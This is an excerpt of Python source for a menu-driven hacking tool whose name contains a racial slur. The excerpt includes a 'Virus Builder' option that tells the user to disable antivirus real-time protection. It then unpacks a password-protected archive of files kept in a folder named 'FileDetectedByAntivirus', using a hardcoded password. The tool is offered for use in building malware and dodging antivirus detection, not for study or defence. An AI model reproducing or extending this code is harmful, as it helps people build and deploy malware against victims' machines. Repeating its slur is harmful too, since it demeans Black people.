...
option_06 = "Ip-Pinger"
option_07 = "ElliotNiggerson-Hacking-Tool"
option_08 = "Soon"
option_09 = "Soon"
option_10 = "Soon"
...
def Menu():
   ...
   banner = f"""{popup_version}                                                                                      
                             ___________       __  _   ___                       _____           
                            / ____/ / (_)___  / /_/ | / (_)___ _____ ____  _____/ ___/____  ____ 
                           / __/ / / / / __ \/ __/  |/ / / __ `/ __ `/ _ \/ ___/\__ \/ __ \/ __ \\
                          / /___/ / / / /_/ / /_/ /|  / / /_/ / /_/ /  __/ /   ___/ / /_/ / / / /
                         /_____/_/_/_/\____/\__/_/ |_/_/\__, /\__, /\___/_/   /____/\____/_/ /_/ 
                                                       /____//____/                              
                                           {white}{github_tool}
{menu}"""
...
while True:
   try:
      ...
      choice = input(MainColor(f""" ┌──({white}{username_pc}@ElliotNiggerson)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
      ...
      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         ...
         if os_name == "Linux":
            ...
            messagebox.showinfo(f"ElliotNiggerson {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
         ...
         messagebox.showinfo(f"ElliotNiggerson {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(ElliotNiggerson).zip")
            ...
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(ElliotNiggerson).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'ElliotNiggerson'
